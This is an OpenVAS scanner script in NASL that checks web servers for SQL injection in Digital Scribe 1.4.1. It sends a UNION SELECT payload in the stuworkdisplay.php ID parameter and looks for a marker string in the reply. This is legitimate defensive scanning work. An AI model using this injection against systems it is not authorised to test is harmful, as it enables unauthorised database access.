###############################################################################
# OpenVAS Vulnerability Test
# $Id: digital_scribe_37292.nasl 15 2013-10-27 12:49:54Z jan $
#
# Digital Scribe Multiple SQL Injection Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Digital Scribe is prone to multiple SQL-injection vulnerabilities
because it fails to sufficiently sanitize user-supplied data before
using it in an SQL query.

Exploiting these issues could allow an attacker to compromise the
application, access or modify data, or exploit latent vulnerabilities
in the underlying database.

Digital Scribe 1.4.1 is vulnerable; other versions may also be
affected.";


if (description)
{
 script_id(100398);
 script_version("$Revision: 15 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2009-12-15 19:11:56 +0100 (Tue, 15 Dec 2009)");
 script_bugtraq_id(37292);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");

 script_name("Digital Scribe Multiple SQL Injection Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/37292");
 script_xref(name : "URL" , value : "http://www.digital-scribe.org/");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/508410");

 script_description(desc);
 script_summary("Determine if Digital Scribe is prone to multiple SQL-injection vulnerabilities");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/DigitalScribe","/digitalscribe",cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir, "/stuworkdisplay.php?ID=-1)%20UNION%20ALL%20SELECT%200x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11%23"); 
  req = http_get(item:url, port:port);
  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);  
  if( buf == NULL )continue;

  if(egrep(pattern: "Student Work", string: buf, icase: TRUE) || 
     egrep(pattern: "OpenVAS-SQL-Injection-Test", string: buf)) {
     
      security_hole(port:port);
      exit(0);

  }
}

exit(0);
